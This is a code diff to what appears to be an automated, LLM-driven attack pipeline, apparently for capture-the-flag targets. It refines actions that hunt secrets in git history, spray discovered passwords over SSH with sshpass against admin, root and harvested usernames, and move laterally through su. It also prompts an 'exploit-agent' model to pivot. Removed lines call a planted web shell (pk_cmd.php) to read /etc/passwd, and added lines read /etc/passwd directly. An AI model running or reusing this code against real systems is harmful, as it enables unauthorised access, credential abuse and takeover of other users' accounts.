@@ -166,7 +166,7 @@ const dirBruteVhost: Action = {
 const vhostBrute: Action = {
   name: "vhost_brute",
   description: "Virtual host discovery",
-  on: (e) => e.type === "HostnameFound",
+  on: (e) => e.type === "HostnameFound" && e.payload.source !== "ffuf_vhost",
   emits: ["HostnameFound"],
   async run(ctx) {
     const hostname = ctx.event.payload.hostname as string;
@@ -204,7 +204,12 @@ const vhostBrute: Action = {
 const gitSecretScan: Action = {
   name: "git_secret_scan",
   description: "Clone public git repos and search commit history for leaked secrets",
-  on: (e) => e.type === "HostnameFound" && !!e.payload.hostname,
+  on: (e) => {
+    if (e.type !== "HostnameFound" || !e.payload.hostname) return false;
+    const hostname = (e.payload.hostname as string).toLowerCase();
+    return /^(git\.|gitlab\.|gitea\.|gogs\.|forgejo\.)/.test(hostname) ||
+      hostname.includes("git") || e.payload.source === "ffuf_vhost";
+  },
   emits: ["CredentialFound"],
   async run(ctx) {
     const hostname = ctx.event.payload.hostname as string;
@@ -266,32 +271,35 @@ const gitSecretScan: Action = {
 
 const credentialTest: Action = {
   name: "credential_test",
-  description: "Try discovered credentials against SSH and web login forms",
-  on: (e) => e.type === "CredentialFound" && !!e.payload.value,
+  description: "Try discovered credentials against SSH",
+  on: (e) => e.type === "CredentialFound" && !!(e.payload.value ?? e.payload.password),
   emits: ["ShellObtained"],
   async run(ctx) {
-    const { source, credential, value } = ctx.event.payload;
-    const password = value as string;
+    const { source } = ctx.event.payload;
+    const password = (ctx.event.payload.value ?? ctx.event.payload.password) as string;
 
-    // Extract username candidates from the credential context
+    // Build username candidates
     const usernames: string[] = [];
-    // Check /etc/passwd for system users with shells
-    const passwd = await ctx.exec("curl", ["-sf", `http://${ctx.target}/storage/tinymce/pk_cmd.php?cmd=grep+sh$+/etc/passwd`]);
-    if (passwd.code === 0) {
-      for (const line of passwd.stdout.split("\n")) {
-        const user = line.split(":")[0];
-        if (user && !["root", "daemon", "bin", "sys", "sync"].includes(user)) {
-          usernames.push(user);
-        }
-      }
-    }
-    // Also try common usernames from the source context
+
+    // From explicit username in payload
+    if (ctx.event.payload.username) usernames.push(ctx.event.payload.username as string);
+
+    // From email in source context
     const emailMatch = (source as string)?.match(/([a-zA-Z0-9._-]+)@/);
     if (emailMatch) usernames.push(emailMatch[1]);
+
+    // From credential string (user:pass or user=pass patterns)
+    const credStr = (ctx.event.payload.credential ?? "") as string;
+    const userPassMatch = credStr.match(/^([a-zA-Z0-9._-]+)[=:]/);
+    if (userPassMatch) usernames.push(userPassMatch[1]);
+
+    // Common service accounts
+    usernames.push("admin", "root");
 
     for (const user of [...new Set(usernames)]) {
       const ssh = await ctx.exec("sshpass", ["-p", password, "ssh",
         "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
+        "-o", "PasswordAuthentication=yes",
         `${user}@${ctx.target}`, "id",
       ]);
       if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
@@ -563,24 +571,50 @@ const flagCapture: Action = {
 const lateralMovement: Action = {
   name: "lateral_move",
   description: "Lateral movement: use discovered credentials to pivot to other users",
-  on: (e) => e.type === "CredentialFound" && e.payload.username != null && e.payload.password != null,
+  on: (e) => e.type === "CredentialFound" && (e.payload.password ?? e.payload.value) != null,
   emits: ["ShellObtained"],
   async run(ctx) {
-    const { username, password } = ctx.event.payload;
+    const password = (ctx.event.payload.password ?? ctx.event.payload.value) as string;
+    const username = ctx.event.payload.username as string | undefined;
+
+    // If no username provided, try to extract from source or discover from target
+    const usernames: string[] = username ? [username] : [];
+    if (usernames.length === 0) {
+      const source = (ctx.event.payload.source ?? "") as string;
+      const emailMatch = source.match(/([a-zA-Z0-9._-]+)@/);
+      if (emailMatch) usernames.push(emailMatch[1]);
+      // Try passwd via SSH or existing shell
+      const passwd = await ctx.exec("cat", ["/etc/passwd"]);
+      if (passwd.code === 0) {
+        for (const line of passwd.stdout.split("\n")) {
+          if (line.includes("/bin/bash") || line.includes("/bin/zsh") || line.includes("/bin/sh")) {
+            const u = line.split(":")[0];
+            if (u && !["root", "daemon", "bin", "sys", "sync", "www-data", "nobody"].includes(u)) {
+              usernames.push(u);
+            }
+          }
+        }
+      }
+    }
+
     await enumerateContext(ctx);
     await identifyBoundary(ctx);
-    const su = await ctx.exec("sh", ["-c", `echo '${password}' | su -s /bin/bash ${username} -c id`]);
-    if (su.code === 0 && su.stdout.includes("uid=")) {
-      await ctx.emit("ShellObtained", { user: username, method: "su", context: su.stdout.trim() });
-      await ctx.discover("positive", "lateral", `Pivoted to ${username} via su`);
-    }
-    const ssh = await ctx.exec("sshpass", ["-p", password as string, "ssh", "-o", "StrictHostKeyChecking=no", `${username}@${ctx.target}`, "id"]);
-    if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
-      await ctx.emit("ShellObtained", { user: username, method: "ssh", context: ssh.stdout.trim() });
-      await ctx.discover("positive", "lateral", `Pivoted to ${username} via SSH`);
+    for (const user of [...new Set(usernames)]) {
+      const su = await ctx.exec("sh", ["-c", `echo '${password}' | su -s /bin/bash ${user} -c id`]);
+      if (su.code === 0 && su.stdout.includes("uid=")) {
+        await ctx.emit("ShellObtained", { user, method: "su", context: su.stdout.trim() });
+        await ctx.discover("positive", "lateral", `Pivoted to ${user} via su`);
+        return;
+      }
+      const ssh = await ctx.exec("sshpass", ["-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", `${user}@${ctx.target}`, "id"]);
+      if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
+        await ctx.emit("ShellObtained", { user, method: "ssh", context: ssh.stdout.trim() });
+        await ctx.discover("positive", "lateral", `Pivoted to ${user} via SSH`);
+        return;
+      }
     }
   },
-  prompt: "Use the discovered credentials ({username}:{password}) to move laterally. Try su, SSH, and any service-specific auth. Once you have a new shell, enumerate the new user's context for further escalation paths.",
+  prompt: "Use the discovered credentials to move laterally. Password: {value}. Source: {source}. Try su, SSH, and any service-specific auth.",
   llm: { agent: "exploit-agent", session: "fresh" },
 };
 
